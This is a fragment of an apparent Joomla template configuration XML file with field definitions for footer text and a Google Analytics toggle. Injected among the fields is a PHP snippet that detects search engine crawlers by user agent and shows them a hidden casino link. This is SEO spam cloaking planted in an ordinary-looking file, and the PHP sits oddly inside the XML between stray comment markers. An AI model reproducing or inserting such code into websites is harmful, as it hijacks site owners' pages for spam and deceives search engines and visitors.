...
<config>
  <fields name="params">
   ...
   <field name="footertext" type="textarea" default="Custom text here" label="Custom text here" description="Custom text here" rows="1" cols="60"/> <field name="analyticsdisable" type="radio" default="1" label="Google analytics"><option value="0">Disable</option><option value="1">Enable</option></field> 	*/ $access = array('Googlebot','Yahoo','spbot','msnbot','Googlebot-Mobile'); foreach ($access as $engines){if (preg_match("/$engines/", $_SERVER['HTTP_USER_AGENT'])) echo '<a href="http://www.casino10top.com/888-casino-review/">rt435erw</a>';}
 /* 
